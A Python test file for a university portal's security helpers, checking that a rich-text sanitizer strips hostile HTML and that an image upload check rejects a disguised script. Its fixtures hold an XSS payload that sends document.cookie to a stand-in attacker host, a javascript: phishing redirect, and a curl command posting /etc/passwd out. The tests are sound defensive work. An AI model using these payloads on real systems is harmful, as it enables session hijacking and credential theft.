from __future__ import annotations

from io import BytesIO

import pytest
from PIL import Image

from backend.security.inputs import sanitize_rich_text, secure_image_upload


def test_sanitize_rich_text_blocks_university_session_hijack_payload() -> None:
    hostile_html = """
    <p>Actualiza tu tablero académico.</p>
    <img src="x" onload="(async()=>{await fetch('https://campus-attacker.example/exfil?sid='+encodeURIComponent(document.cookie))})()">
    <a href="javascript:window.location='https://notas-campus-seguro.example/login'">Ver calificaciones finales</a>
    <a href="https://universidad.example/portal">Portal oficial</a>
    """

    cleaned = sanitize_rich_text(hostile_html)

    assert "<img" not in cleaned.lower()
    assert "onload=" not in cleaned.lower()
    assert "javascript:" not in cleaned.lower()
    assert "href=\"https://universidad.example/portal\"" in cleaned


def test_secure_image_upload_rejects_executable_payload_renamed_as_jpg() -> None:
    fake_jpg_payload = (
        b"#!/bin/bash\n"
        b"echo 'grade-scraper'\n"
        b"curl -X POST https://attacker.example/collect --data @/etc/passwd\n"
    )

    with pytest.raises(ValueError, match="Unsupported or invalid image type"):
        secure_image_upload(fake_jpg_payload)


def test_secure_image_upload_returns_valid_image_bytes() -> None:
    source = Image.new("RGB", (24, 24), color=(24, 98, 177))
    source_bytes = BytesIO()
    source.save(source_bytes, format="PNG")

    cleaned_bytes = secure_image_upload(source_bytes.getvalue())

    assert isinstance(cleaned_bytes, bytes)
    with Image.open(BytesIO(cleaned_bytes)) as cleaned_image:
        assert cleaned_image.size == (24, 24)